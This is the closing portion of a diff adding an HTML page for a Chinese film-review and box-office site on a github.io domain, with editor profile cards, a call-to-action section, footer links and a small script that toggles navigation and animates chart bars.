+      <div class="person"><div class="top"><div class="av" style="background-image:url('https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=70')"></div><h5>周淮<em>主编 · 商业片观察</em></h5></div><blockquote>「评分只负责告诉你共识在哪，我更想写清楚一部片子为什么值回票价，或者为什么不值。」</blockquote></div>
+      <div class="person"><div class="top"><div class="av" style="background-image:url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=200&q=70')"></div><h5>林晚<em>影评人 · 作者电影</em></h5></div><blockquote>「不追新片的时髦，只追镜头背后的那个人。好导演每部片子都在回答同一个问题。」</blockquote></div>
+      <div class="person"><div class="top"><div class="av" style="background-image:url('https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=200&q=70')"></div><h5>陈默<em>数据编辑 · 票房与排片</em></h5></div><blockquote>「数字不会撒谎，但数字需要被读懂。排片占比和上座率之间的差，往往藏着真实口碑。」</blockquote></div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section id="about">
+  <div class="wrap">
+    <div class="cta">
+      <h3>想找一部今晚值得看的电影？</h3>
+      <p>猫眼电影网 maoyandianyingwang-zh.github.io 每日更新院线热映票房榜、排片场次、专业影评与行业观察，陪你从「看电影」走到「懂电影」。</p>
+      <div class="acts">
+        <a class="btn btn-main" href="#board">立即查看今日榜单</a>
+        <a class="btn btn-ghost" href="#feature">阅读深度影评</a>
+      </div>
+      <div class="urlbox">本站唯一访问地址 <code>https://maoyandianyingwang-zh.github.io</code></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand">
+        <a class="logo" href="#top"><b>猫眼<i>电影</i>网</b></a>
+        <p>聚焦院线新片与观影决策的独立电影媒体，提供实时票房、排片场次、专业影评与行业观察。</p>
+        <div class="chips"><a href="#">实时票房</a><a href="#">选片指南</a><a href="#">导演访谈</a><a href="#">观影补贴</a></div>
+      </div>
+      <div><h6>看电影</h6><ul><li><a href="#board">今日票房榜</a></li><li><a href="#guide">编辑部选片</a></li><li><a href="#show">排片与选座</a></li><li><a href="#">影评专区</a></li></ul></div>
+      <div><h6>读内容</h6><ul><li><a href="#feature">封面报道</a></li><li><a href="#news">行业观察</a></li><li><a href="#crew">编辑部</a></li><li><a href="#">读者来信</a></li></ul></div>
+      <div><h6>关于本站</h6><ul><li><a href="#about">网站介绍</a></li><li><a href="#">内容合作</a></li><li><a href="#">投稿须知</a></li><li><a href="#">联系方式</a></li></ul></div>
+    </div>
+    <div class="legal">
+      <span>© 2026 猫眼电影网 maoyandianyingwang-zh.github.io · 保留所有权利</span>
+      <span>本站访问地址：<b>https://maoyandianyingwang-zh.github.io</b></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('mBtn'),nav=document.getElementById('nav');
+  if(btn&&nav){
+    btn.addEventListener('click',function(){nav.classList.toggle('open')});
+    nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+  }
+  var rows=document.querySelectorAll('.trend i');
+  rows.forEach(function(r,i){r.style.height='0%';setTimeout(function(){r.style.height=r.getAttribute('data-h')||r.style.height},120*i+120)});
+})();
+</script>
+</body>
+</html>
